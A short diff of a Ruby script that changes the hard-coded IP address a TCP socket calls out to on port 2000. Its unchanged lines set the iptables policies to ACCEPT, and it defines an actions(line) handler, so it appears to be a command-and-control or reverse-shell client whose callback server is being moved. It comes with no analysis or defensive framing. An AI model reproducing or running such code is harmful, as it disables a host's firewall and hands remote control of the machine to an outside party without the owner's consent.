@@ -5,7 +5,7 @@ require 'socket'
 system "iptables -P INPUT ACCEPT"
 system "iptables -P OUTPUT ACCEPT"
 
-socket = TCPSocket.new('52.8.239.81', 2000)
+socket = TCPSocket.new('52.9.13.127', 2000)
 socket.puts("Hey!")
 
 def actions(line)
